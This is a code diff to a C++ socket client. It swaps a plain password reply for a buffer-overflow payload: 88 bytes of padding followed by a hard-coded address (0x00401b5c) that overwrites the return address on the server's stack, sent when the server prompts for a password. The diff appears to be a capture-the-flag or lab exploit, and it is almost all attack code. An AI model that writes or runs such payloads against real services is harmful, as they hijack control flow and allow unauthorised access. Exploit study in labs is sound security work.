@@ -34,8 +34,14 @@ int main() {
         std::cout << "Server: " << buffer;
 
         if (strstr(buffer, "Please enter a password to continue:") != nullptr) {
-            const char *password = "11\n";
-            send(socket_descriptor, password, strlen(password), 0);
+            char password[88 + 8 + 1];
+            for (int i = 0; i < 88; i++) {
+                password[i] = ' ';
+            }
+            *(reinterpret_cast<size_t *>(password + 88)) = 0x00401b5c;
+
+            password[88 + 8] = '\n';
+            send(socket_descriptor, password, sizeof(password), 0);
             std::cout << "Sent password: " << password;
         }
 
